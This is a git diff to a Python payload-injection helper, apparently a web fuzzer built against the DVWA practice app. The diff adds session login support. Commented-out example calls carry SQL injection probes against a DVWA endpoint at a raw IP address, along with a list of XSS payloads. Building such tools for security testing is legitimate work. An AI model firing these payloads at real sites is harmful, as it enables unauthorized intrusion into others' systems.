@@ -46,7 +46,7 @@ def post_validation(url: str, type_attack: str, login_dvwa: bool = False):
 
 # post request -> url, payloads, data (x-urlformencoded)
 
-def post_request(url: str, payloads: list, data: dict):
+def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False):
     # get each value from data.values()
     # from value, check whether it has "$$" or not
     #   if "$$" exists, change to payload
@@ -56,6 +56,11 @@ def post_request(url: str, payloads: list, data: dict):
     # initial_data = {"ie": "", "gl": "$$"}
 
     # data = [{"ie": payload1, "hl": "a", "h3": "b"}, {"ie": payload2, "hl": "a", "h3": "b"}]
+    
+    if (login_dvwa):
+        session = createSession(URL)
+    else:
+        session = requests
     current_data = data.copy()
     for key, value in data.items():
         if (re.search("\$(.*?)\$", value) != None):
@@ -72,7 +77,7 @@ def post_request(url: str, payloads: list, data: dict):
     
     result = []
     for index, value_dict in enumerate(processed_data):
-        response = requests.post(url, json = value_dict)
+        response = session.post(url, json = value_dict)
         status_code = response.status_code
         try:
             content_length = response.headers["Content-Length"]
@@ -83,4 +88,7 @@ def post_request(url: str, payloads: list, data: dict):
     print(len(processed_data), len(payloads))
     return result
 
+
+# if __name__ == "__main__":
+    # post_request("http://47.245.99.142/vulnerabilities/sqli/", [requote_uri(payload) for payload in ["ORDER BY 4--", "and (select substring(@@version,1,1))='X"]], {"id": "$$", "Submit": "Submit"}, login_dvwa=True)
 # post_request("http://google.com", ["<script>alert('123')</script>", '-prompt(8)-', "'-prompt(8)-'", '";a=prompt,a()//', "';a=prompt,a()//", '\'-eval("window[\'pro\'%2B\'mpt\'](8)")-\'', '-eval("window[\'pro\'%2B\'mpt\'](8)")-', '"onclick=prompt(8)>"@x.y', '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y'], {"data": "data", "d": "$$"})
